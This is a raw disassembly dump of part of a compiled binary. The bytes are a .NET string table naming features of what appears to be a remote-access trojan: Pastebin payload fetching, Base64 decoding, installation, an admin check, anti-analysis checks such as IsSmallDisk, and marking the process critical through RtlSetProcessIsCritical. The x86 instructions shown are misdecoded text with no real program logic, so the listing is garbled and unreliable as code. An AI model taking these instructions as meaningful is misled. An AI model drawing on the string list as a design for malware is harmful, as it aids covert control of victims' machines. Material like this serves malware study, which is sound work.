  408059:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408060:	5f                   	pop    %edi
  408061:	50                   	push   %eax
  408062:	61                   	popa
  408063:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  40806a:	64 64 
  40806c:	5f                   	pop    %edi
  40806d:	53                   	push   %ebx
  40806e:	65 73 73             	gs jae 0x4080e4
  408071:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408078:	6e                   	outsb  %ds:(%esi),(%dx)
  408079:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40807d:	73 74                	jae    0x4080f3
  40807f:	65 6d                	gs insl (%dx),%es:(%edi)
  408081:	45                   	inc    %ebp
  408082:	76 65                	jbe    0x4080e9
  408084:	6e                   	outsb  %ds:(%esi),(%dx)
  408085:	74 73                	je     0x4080fa
  408087:	5f                   	pop    %edi
  408088:	53                   	push   %ebx
  408089:	65 73 73             	gs jae 0x4080ff
  40808c:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408093:	6e                   	outsb  %ds:(%esi),(%dx)
  408094:	67 00 55 54          	add    %dl,0x54(%di)
  408098:	46                   	inc    %esi
  408099:	38 45 6e             	cmp    %al,0x6e(%ebp)
  40809c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40809f:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4080a6:	74 65                	je     0x40810d
  4080a8:	6d                   	insl   (%dx),%es:(%edi)
  4080a9:	2e 44                	cs inc %esp
  4080ab:	72 61                	jb     0x40810e
  4080ad:	77 69                	ja     0x408118
  4080af:	6e                   	outsb  %ds:(%esi),(%dx)
  4080b0:	67 2e 49             	addr16 cs dec %ecx
  4080b3:	6d                   	insl   (%dx),%es:(%edi)
  4080b4:	61                   	popa
  4080b5:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4080bc:	73 
  4080bd:	74 65                	je     0x408124
  4080bf:	6d                   	insl   (%dx),%es:(%edi)
  4080c0:	2e 52                	cs push %edx
  4080c2:	75 6e                	jne    0x408132
  4080c4:	74 69                	je     0x40812f
  4080c6:	6d                   	insl   (%dx),%es:(%edi)
  4080c7:	65 2e 56             	gs cs push %esi
  4080ca:	65 72 73             	gs jb  0x408140
  4080cd:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4080d4:	46                   	inc    %esi
  4080d5:	72 6f                	jb     0x408146
  4080d7:	6d                   	insl   (%dx),%es:(%edi)
  4080d8:	42                   	inc    %edx
  4080d9:	61                   	popa
  4080da:	73 65                	jae    0x408141
  4080dc:	36 34 53             	ss xor $0x53,%al
  4080df:	74 72                	je     0x408153
  4080e1:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4080e8:	61                   	popa
  4080e9:	73 65                	jae    0x408150
  4080eb:	36 34 53             	ss xor $0x53,%al
  4080ee:	74 72                	je     0x408162
  4080f0:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  4080f7:	64 53                	fs push %ebx
  4080f9:	74 72                	je     0x40816d
  4080fb:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408102:	6e                   	outsb  %ds:(%esi),(%dx)
  408103:	6c                   	insb   (%dx),%es:(%edi)
  408104:	6f                   	outsl  %ds:(%esi),(%dx)
  408105:	61                   	popa
  408106:	64 53                	fs push %ebx
  408108:	74 72                	je     0x40817c
  40810a:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408111:	74 65                	je     0x408178
  408113:	53                   	push   %ebx
  408114:	74 72                	je     0x408188
  408116:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40811d:	74 72                	je     0x408191
  40811f:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408126:	5f                   	pop    %edi
  408127:	41                   	inc    %ecx
  408128:	73 53                	jae    0x40817d
  40812a:	74 72                	je     0x40819e
  40812c:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408133:	5f                   	pop    %edi
  408134:	41                   	inc    %ecx
  408135:	73 53                	jae    0x40818a
  408137:	74 72                	je     0x4081ab
  408139:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  408140:	65 73 41             	gs jae 0x408184
  408143:	73 53                	jae    0x408198
  408145:	74 72                	je     0x4081b9
  408147:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  40814e:	41                   	inc    %ecx
  40814f:	73 53                	jae    0x4081a4
  408151:	74 72                	je     0x4081c5
  408153:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  40815a:	41                   	inc    %ecx
  40815b:	73 53                	jae    0x4081b0
  40815d:	74 72                	je     0x4081d1
  40815f:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408166:	53                   	push   %ebx
  408167:	74 72                	je     0x4081db
  408169:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  408170:	65 73 41             	gs jae 0x4081b4
  408173:	73 48                	jae    0x4081bd
  408175:	65 78 53             	gs js  0x4081cb
  408178:	74 72                	je     0x4081ec
  40817a:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408181:	73 74                	jae    0x4081f7
  408183:	72 69                	jb     0x4081ee
  408185:	6e                   	outsb  %ds:(%esi),(%dx)
  408186:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40818a:	73 74                	jae    0x408200
  40818c:	65 6d                	gs insl (%dx),%es:(%edi)
  40818e:	2e 44                	cs inc %esp
  408190:	72 61                	jb     0x4081f3
  408192:	77 69                	ja     0x4081fd
  408194:	6e                   	outsb  %ds:(%esi),(%dx)
  408195:	67 00 50 6f          	add    %dl,0x6f(%bx,%si)
  408199:	6e                   	outsb  %ds:(%esi),(%dx)
  40819a:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40819e:	74 5f                	je     0x4081ff
  4081a0:	45                   	inc    %ebp
  4081a1:	72 72                	jb     0x408215
  4081a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a4:	72 44                	jb     0x4081ea
  4081a6:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  4081ad:	73 67                	jae    0x408216
  4081af:	00 43 6f             	add    %al,0x6f(%ebx)
  4081b2:	6d                   	insl   (%dx),%es:(%edi)
  4081b3:	70 75                	jo     0x40822a
  4081b5:	74 65                	je     0x40821c
  4081b7:	48                   	dec    %eax
  4081b8:	61                   	popa
  4081b9:	73 68                	jae    0x408223
  4081bb:	00 73 74             	add    %dh,0x74(%ebx)
  4081be:	72 54                	jb     0x408214
  4081c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c1:	48                   	dec    %eax
  4081c2:	61                   	popa
  4081c3:	73 68                	jae    0x40822d
  4081c5:	00 47 65             	add    %al,0x65(%edi)
  4081c8:	74 48                	je     0x408212
  4081ca:	61                   	popa
  4081cb:	73 68                	jae    0x408235
  4081cd:	00 56 65             	add    %dl,0x65(%esi)
  4081d0:	72 69                	jb     0x40823b
  4081d2:	66 79 48             	data16 jns 0x40821d
  4081d5:	61                   	popa
  4081d6:	73 68                	jae    0x408240
  4081d8:	00 46 6c             	add    %al,0x6c(%esi)
  4081db:	75 73                	jne    0x408250
  4081dd:	68 00 67 65 74       	push   $0x74656700
  4081e2:	5f                   	pop    %edi
  4081e3:	45                   	inc    %ebp
  4081e4:	78 65                	js     0x40824b
  4081e6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4081e9:	61                   	popa
  4081ea:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4081ee:	61                   	popa
  4081ef:	74 68                	je     0x408259
  4081f1:	00 47 65             	add    %al,0x65(%edi)
  4081f4:	74 54                	je     0x40824a
  4081f6:	65 6d                	gs insl (%dx),%es:(%edi)
  4081f8:	70 50                	jo     0x40824a
  4081fa:	61                   	popa
  4081fb:	74 68                	je     0x408265
  4081fd:	00 70 61             	add    %dh,0x61(%eax)
  408200:	74 68                	je     0x40826a
  408202:	00 48 6d             	add    %cl,0x6d(%eax)
  408205:	61                   	popa
  408206:	63 53 68             	arpl   %edx,0x68(%ebx)
  408209:	61                   	popa
  40820a:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408210:	67 74 68             	addr16 je 0x40827b
  408213:	00 67 65             	add    %ah,0x65(%edi)
  408216:	74 5f                	je     0x408277
  408218:	4c                   	dec    %esp
  408219:	65 6e                	outsb  %gs:(%esi),(%dx)
  40821b:	67 74 68             	addr16 je 0x408286
  40821e:	00 49 76             	add    %cl,0x76(%ecx)
  408221:	4c                   	dec    %esp
  408222:	65 6e                	outsb  %gs:(%esi),(%dx)
  408224:	67 74 68             	addr16 je 0x40828f
  408227:	00 41 75             	add    %al,0x75(%ecx)
  40822a:	74 68                	je     0x408294
  40822c:	4b                   	dec    %ebx
  40822d:	65 79 4c             	gs jns 0x40827c
  408230:	65 6e                	outsb  %gs:(%esi),(%dx)
  408232:	67 74 68             	addr16 je 0x40829d
  408235:	00 55 72             	add    %dl,0x72(%ebp)
  408238:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  40823e:	00 6d 73             	add    %ch,0x73(%ebp)
  408241:	67 70 61             	addr16 jo 0x4082a5
  408244:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  408247:	62 6a 00             	bound  %ebp,0x0(%edx)
  40824a:	6c                   	insb   (%dx),%es:(%edi)
  40824b:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  408252:	6f                   	outsl  %ds:(%esi),(%dx)
  408253:	62 6a 00             	bound  %ebp,0x0(%edx)
  408256:	43                   	inc    %ebx
  408257:	6c                   	insb   (%dx),%es:(%edi)
  408258:	69 65 6e 74 2e 4d 65 	imul   $0x654d2e74,0x6e(%ebp),%esp
  40825f:	73 73                	jae    0x4082d4
  408261:	61                   	popa
  408262:	67 65 50             	addr16 gs push %eax
  408265:	61                   	popa
  408266:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408269:	4d                   	dec    %ebp
  40826a:	73 67                	jae    0x4082d3
  40826c:	50                   	push   %eax
  40826d:	61                   	popa
  40826e:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408271:	41                   	inc    %ecx
  408272:	73 79                	jae    0x4082ed
  408274:	6e                   	outsb  %ds:(%esi),(%dx)
  408275:	63 43 61             	arpl   %eax,0x61(%ebx)
  408278:	6c                   	insb   (%dx),%es:(%edi)
  408279:	6c                   	insb   (%dx),%es:(%edi)
  40827a:	62 61 63             	bound  %esp,0x63(%ecx)
  40827d:	6b 00 52             	imul   $0x52,(%eax),%eax
  408280:	65 6d                	gs insl (%dx),%es:(%edi)
  408282:	6f                   	outsl  %ds:(%esi),(%dx)
  408283:	74 65                	je     0x4082ea
  408285:	43                   	inc    %ebx
  408286:	65 72 74             	gs jb  0x4082fd
  408289:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408290:	56                   	push   %esi
  408291:	61                   	popa
  408292:	6c                   	insb   (%dx),%es:(%edi)
  408293:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40829a:	43 
  40829b:	61                   	popa
  40829c:	6c                   	insb   (%dx),%es:(%edi)
  40829d:	6c                   	insb   (%dx),%es:(%edi)
  40829e:	62 61 63             	bound  %esp,0x63(%ecx)
  4082a1:	6b 00 54             	imul   $0x54,(%eax),%eax
  4082a4:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  4082ab:	6c                   	insb   (%dx),%es:(%edi)
  4082ac:	62 61 63             	bound  %esp,0x63(%ecx)
  4082af:	6b 00 75             	imul   $0x75,(%eax),%eax
  4082b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b3:	70 61                	jo     0x408316
  4082b5:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  4082b8:	6d                   	insl   (%dx),%es:(%edi)
  4082b9:	73 67                	jae    0x408322
  4082bb:	70 61                	jo     0x40831e
  4082bd:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4082c0:	52                   	push   %edx
  4082c1:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4082c8:	4b 65 
  4082ca:	79 50                	jns    0x40831c
  4082cc:	65 72 6d             	gs jb  0x40833c
  4082cf:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  4082d6:	68 65 63 6b 00       	push   $0x6b6365
  4082db:	46                   	inc    %esi
  4082dc:	6c                   	insb   (%dx),%es:(%edi)
  4082dd:	75 73                	jne    0x408352
  4082df:	68 46 69 6e 61       	push   $0x616e6946
  4082e4:	6c                   	insb   (%dx),%es:(%edi)
  4082e5:	42                   	inc    %edx
  4082e6:	6c                   	insb   (%dx),%es:(%edi)
  4082e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e8:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4082eb:	49                   	dec    %ecx
  4082ec:	73 53                	jae    0x408341
  4082ee:	6d                   	insl   (%dx),%es:(%edi)
  4082ef:	61                   	popa
  4082f0:	6c                   	insb   (%dx),%es:(%edi)
  4082f1:	6c                   	insb   (%dx),%es:(%edi)
  4082f2:	44                   	inc    %esp
  4082f3:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  4082fa:	6c                   	insb   (%dx),%es:(%edi)
  4082fb:	00 66 56             	add    %ah,0x56(%esi)
  4082fe:	61                   	popa
  4082ff:	6c                   	insb   (%dx),%es:(%edi)
  408300:	00 69 56             	add    %ch,0x56(%ecx)
  408303:	61                   	popa
  408304:	6c                   	insb   (%dx),%es:(%edi)
  408305:	00 73 74             	add    %dh,0x74(%ebx)
  408308:	72 56                	jb     0x408360
  40830a:	61                   	popa
  40830b:	6c                   	insb   (%dx),%es:(%edi)
  40830c:	00 52 74             	add    %dl,0x74(%edx)
  40830f:	6c                   	insb   (%dx),%es:(%edi)
  408310:	53                   	push   %ebx
  408311:	65 74 50             	gs je  0x408364
  408314:	72 6f                	jb     0x408385
  408316:	63 65 73             	arpl   %esp,0x73(%ebp)
  408319:	73 49                	jae    0x408364
  40831b:	73 43                	jae    0x408360
  40831d:	72 69                	jb     0x408388
  40831f:	74 69                	je     0x40838a
  408321:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408324:	00 50 72             	add    %dl,0x72(%eax)
  408327:	6f                   	outsl  %ds:(%esi),(%dx)
  408328:	63 65 73             	arpl   %esp,0x73(%ebp)
  40832b:	73 43                	jae    0x408370
  40832d:	72 69                	jb     0x408398
  40832f:	74 69                	je     0x40839a
  408331:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408334:	00 4e 65             	add    %cl,0x65(%esi)
  408337:	74 77                	je     0x4083b0
  408339:	6f                   	outsl  %ds:(%esi),(%dx)
  40833a:	72 6b                	jb     0x4083a7
  40833c:	43                   	inc    %ebx
  40833d:	72 65                	jb     0x4083a4
  40833f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408342:	74 69                	je     0x4083ad
  408344:	61                   	popa
  408345:	6c                   	insb   (%dx),%es:(%edi)
  408346:	00 53 79             	add    %dl,0x79(%ebx)
  408349:	73 74                	jae    0x4083bf
  40834b:	65 6d                	gs insl (%dx),%es:(%edi)
  40834d:	2e 53                	cs push %ebx
  40834f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408353:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40835a:	6e 
  40835b:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40835e:	61                   	popa
  40835f:	6c                   	insb   (%dx),%es:(%edi)
  408360:	00 57 69             	add    %dl,0x69(%edi)
  408363:	6e                   	outsb  %ds:(%esi),(%dx)
  408364:	64 6f                	outsl  %fs:(%esi),(%dx)
  408366:	77 73                	ja     0x4083db
  408368:	50                   	push   %eax
  408369:	72 69                	jb     0x4083d4
  40836b:	6e                   	outsb  %ds:(%esi),(%dx)
  40836c:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40836f:	61                   	popa
  408370:	6c                   	insb   (%dx),%es:(%edi)
  408371:	00 41 72             	add    %al,0x72(%ecx)
  408374:	65 45                	gs inc %ebp
  408376:	71 75                	jno    0x4083ed
  408378:	61                   	popa
  408379:	6c                   	insb   (%dx),%es:(%edi)
  40837a:	00 67 65             	add    %ah,0x65(%edi)
  40837d:	74 5f                	je     0x4083de
  40837f:	49                   	dec    %ecx
  408380:	6e                   	outsb  %ds:(%esi),(%dx)
  408381:	74 65                	je     0x4083e8
  408383:	72 76                	jb     0x4083fb
  408385:	61                   	popa
  408386:	6c                   	insb   (%dx),%es:(%edi)
  408387:	00 73 65             	add    %dh,0x65(%ebx)
  40838a:	74 5f                	je     0x4083eb
  40838c:	49                   	dec    %ecx
  40838d:	6e                   	outsb  %ds:(%esi),(%dx)
  40838e:	74 65                	je     0x4083f5
  408390:	72 76                	jb     0x408408
  408392:	61                   	popa
  408393:	6c                   	insb   (%dx),%es:(%edi)
  408394:	00 43 6c             	add    %al,0x6c(%ebx)
  408397:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40839e:	73 74                	jae    0x408414
  4083a0:	61                   	popa
  4083a1:	6c                   	insb   (%dx),%es:(%edi)
  4083a2:	6c                   	insb   (%dx),%es:(%edi)
  4083a3:	00 6b 65             	add    %ch,0x65(%ebx)
  4083a6:	72 6e                	jb     0x408416
  4083a8:	65 6c                	gs insb (%dx),%es:(%edi)
  4083aa:	33 32                	xor    (%edx),%esi
  4083ac:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083af:	6c                   	insb   (%dx),%es:(%edi)
  4083b0:	00 6e 74             	add    %ch,0x74(%esi)
  4083b3:	64 6c                	fs insb (%dx),%es:(%edi)
  4083b5:	6c                   	insb   (%dx),%es:(%edi)
  4083b6:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083b9:	6c                   	insb   (%dx),%es:(%edi)
  4083ba:	00 4b 69             	add    %cl,0x69(%ebx)
  4083bd:	6c                   	insb   (%dx),%es:(%edi)
  4083be:	6c                   	insb   (%dx),%es:(%edi)
  4083bf:	00 50 6f             	add    %dl,0x6f(%eax)
  4083c2:	6c                   	insb   (%dx),%es:(%edi)
  4083c3:	6c                   	insb   (%dx),%es:(%edi)
  4083c4:	00 57 72             	add    %dl,0x72(%edi)
  4083c7:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  4083ce:	00 
  4083cf:	53                   	push   %ebx
  4083d0:	65 74 41             	gs je  0x408414
  4083d3:	73 4e                	jae    0x408423
  4083d5:	75 6c                	jne    0x408443
  4083d7:	6c                   	insb   (%dx),%es:(%edi)
  4083d8:	00 4d 75             	add    %cl,0x75(%ebp)
  4083db:	74 65                	je     0x408442
  4083dd:	78 43                	js     0x408422
  4083df:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e1:	74 72                	je     0x408455
  4083e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e4:	6c                   	insb   (%dx),%es:(%edi)
  4083e5:	00 45 6e             	add    %al,0x6e(%ebp)
  4083e8:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4083eb:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  4083ef:	72 65                	jb     0x408456
  4083f1:	61                   	popa
  4083f2:	6d                   	insl   (%dx),%es:(%edi)
  4083f3:	00 46 69             	add    %al,0x69(%esi)
  4083f6:	6c                   	insb   (%dx),%es:(%edi)
  4083f7:	65 53                	gs push %ebx
  4083f9:	74 72                	je     0x40846d
  4083fb:	65 61                	gs popa
  4083fd:	6d                   	insl   (%dx),%es:(%edi)
  4083fe:	00 4e 65             	add    %cl,0x65(%esi)
  408401:	74 77                	je     0x40847a
  408403:	6f                   	outsl  %ds:(%esi),(%dx)
  408404:	72 6b                	jb     0x408471
  408406:	53                   	push   %ebx
  408407:	74 72                	je     0x40847b
  408409:	65 61                	gs popa
  40840b:	6d                   	insl   (%dx),%es:(%edi)
  40840c:	00 53 73             	add    %dl,0x73(%ebx)
  40840f:	6c                   	insb   (%dx),%es:(%edi)
  408410:	53                   	push   %ebx
  408411:	74 72                	je     0x408485
  408413:	65 61                	gs popa
  408415:	6d                   	insl   (%dx),%es:(%edi)
  408416:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40841a:	6f                   	outsl  %ds:(%esi),(%dx)
  40841b:	64 65 46             	fs gs inc %esi
  40841e:	72 6f                	jb     0x40848f
  408420:	6d                   	insl   (%dx),%es:(%edi)
  408421:	53                   	push   %ebx
  408422:	74 72                	je     0x408496
  408424:	65 61                	gs popa
  408426:	6d                   	insl   (%dx),%es:(%edi)
  408427:	00 43 72             	add    %al,0x72(%ebx)
  40842a:	79 70                	jns    0x40849c
  40842c:	74 6f                	je     0x40849d
  40842e:	53                   	push   %ebx
  40842f:	74 72                	je     0x4084a3
  408431:	65 61                	gs popa
  408433:	6d                   	insl   (%dx),%es:(%edi)
  408434:	00 47 5a             	add    %al,0x5a(%edi)
  408437:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  40843e:	6d                   	insl   (%dx),%es:(%edi)
  40843f:	00 4d 65             	add    %cl,0x65(%ebp)
  408442:	6d                   	insl   (%dx),%es:(%edi)
  408443:	6f                   	outsl  %ds:(%esi),(%dx)
  408444:	72 79                	jb     0x4084bf
  408446:	53                   	push   %ebx
  408447:	74 72                	je     0x4084bb
  408449:	65 61                	gs popa
  40844b:	6d                   	insl   (%dx),%es:(%edi)
  40844c:	00 50 72             	add    %dl,0x72(%eax)
  40844f:	6f                   	outsl  %ds:(%esi),(%dx)
  408450:	67 72 61             	addr16 jb 0x4084b4
  408453:	6d                   	insl   (%dx),%es:(%edi)
  408454:	00 67 65             	add    %ah,0x65(%edi)
  408457:	74 5f                	je     0x4084b8
  408459:	49                   	dec    %ecx
  40845a:	74 65                	je     0x4084c1
  40845c:	6d                   	insl   (%dx),%es:(%edi)
  40845d:	00 67 65             	add    %ah,0x65(%edi)
  408460:	74 5f                	je     0x4084c1
  408462:	49                   	dec    %ecx
  408463:	73 36                	jae    0x40849b
  408465:	34 42                	xor    $0x42,%al
  408467:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40846e:	74 
  40846f:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408476:	65 6d                	gs insl (%dx),%es:(%edi)
  408478:	00 43 6c             	add    %al,0x6c(%ebx)
  40847b:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408482:	67 6f                	outsl  %ds:(%si),(%dx)
  408484:	72 69                	jb     0x4084ef
  408486:	74 68                	je     0x4084f0
  408488:	6d                   	insl   (%dx),%es:(%edi)
  408489:	00 53 79             	add    %dl,0x79(%ebx)
  40848c:	6d                   	insl   (%dx),%es:(%edi)
  40848d:	6d                   	insl   (%dx),%es:(%edi)
  40848e:	65 74 72             	gs je  0x408503
  408491:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408498:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40849f:	79 
  4084a0:	6d                   	insl   (%dx),%es:(%edi)
  4084a1:	6d                   	insl   (%dx),%es:(%edi)
  4084a2:	65 74 72             	gs je  0x408517
  4084a5:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4084ac:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4084b3:	73 
  4084b4:	68 41 6c 67 6f       	push   $0x6f676c41
  4084b9:	72 69                	jb     0x408524
  4084bb:	74 68                	je     0x408525
  4084bd:	6d                   	insl   (%dx),%es:(%edi)
  4084be:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4084c2:	6d                   	insl   (%dx),%es:(%edi)
  4084c3:	00 52 61             	add    %dl,0x61(%edx)
  4084c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c7:	64 6f                	outsl  %fs:(%esi),(%dx)
  4084c9:	6d                   	insl   (%dx),%es:(%edi)
  4084ca:	00 49 43             	add    %cl,0x43(%ecx)
  4084cd:	72 79                	jb     0x408548
  4084cf:	70 74                	jo     0x408545
  4084d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d2:	54                   	push   %esp
  4084d3:	72 61                	jb     0x408536
  4084d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084d6:	73 66                	jae    0x40853e
  4084d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d9:	72 6d                	jb     0x408548
  4084db:	00 4d 73             	add    %cl,0x73(%ebp)
  4084de:	67 50                	addr16 push %eax
  4084e0:	61                   	popa
  4084e1:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  4084e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e5:	75 6d                	jne    0x408554
  4084e7:	00 57 72             	add    %dl,0x72(%edi)
  4084ea:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  4084f1:	65 
  4084f2:	61                   	popa
  4084f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f4:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4084f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4084fa:	6c                   	insb   (%dx),%es:(%edi)
  4084fb:	65 61                	gs popa
  4084fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fe:	00 53 65             	add    %dl,0x65(%ebx)
  408501:	74 41                	je     0x408544
  408503:	73 42                	jae    0x408547
  408505:	6f                   	outsl  %ds:(%esi),(%dx)
  408506:	6f                   	outsl  %ds:(%esi),(%dx)
  408507:	6c                   	insb   (%dx),%es:(%edi)
  408508:	65 61                	gs popa
  40850a:	6e                   	outsb  %ds:(%esi),(%dx)
  40850b:	00 48 77             	add    %cl,0x77(%eax)
  40850e:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  408515:	65 
  408516:	6e                   	outsb  %ds:(%esi),(%dx)
  408517:	00 63 68             	add    %ah,0x68(%ebx)
  40851a:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  408521:	4d 
  408522:	61                   	popa
  408523:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40852a:	43                   	inc    %ebx
  40852b:	68 61 69 6e 00       	push   $0x6e6961
  408530:	63 68 61             	arpl   %ebp,0x61(%eax)
  408533:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  40853a:	6f                   	outsl  %ds:(%esi),(%dx)
  40853b:	6d                   	insl   (%dx),%es:(%edi)
  40853c:	61                   	popa
  40853d:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408544:	43                   	inc    %ebx
  408545:	75 72                	jne    0x4085b9
  408547:	72 65                	jb     0x4085ae
  408549:	6e                   	outsb  %ds:(%esi),(%dx)
  40854a:	74 44                	je     0x408590
  40854c:	6f                   	outsl  %ds:(%esi),(%dx)
  40854d:	6d                   	insl   (%dx),%es:(%edi)
  40854e:	61                   	popa
  40854f:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  408556:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  40855a:	00 49 73             	add    %cl,0x73(%ecx)
  40855d:	41                   	inc    %ecx
  40855e:	64 6d                	fs insl (%dx),%es:(%edi)
  408560:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408567:	00 47 65             	add    %al,0x65(%edi)
  40856a:	74 46                	je     0x4085b2
  40856c:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408573:	57 
  408574:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  40857b:	78 
  40857c:	74 65                	je     0x4085e3
  40857e:	6e                   	outsb  %ds:(%esi),(%dx)
  40857f:	73 69                	jae    0x4085ea
  408581:	6f                   	outsl  %ds:(%esi),(%dx)
  408582:	6e                   	outsb  %ds:(%esi),(%dx)
  408583:	00 67 65             	add    %ah,0x65(%edi)
  408586:	74 5f                	je     0x4085e7
  408588:	4f                   	dec    %edi
  408589:	53                   	push   %ebx
  40858a:	56                   	push   %esi
  40858b:	65 72 73             	gs jb  0x408601
  40858e:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408595:	74 65                	je     0x4085fc
  408597:	6d                   	insl   (%dx),%es:(%edi)
  408598:	2e 49                	cs dec %ecx
  40859a:	4f                   	dec    %edi
  40859b:	2e 43                	cs inc %ebx
  40859d:	6f                   	outsl  %ds:(%esi),(%dx)
  40859e:	6d                   	insl   (%dx),%es:(%edi)
  40859f:	70 72                	jo     0x408613
  4085a1:	65 73 73             	gs jae 0x408617
  4085a4:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4085ab:	6c                   	insb   (%dx),%es:(%edi)
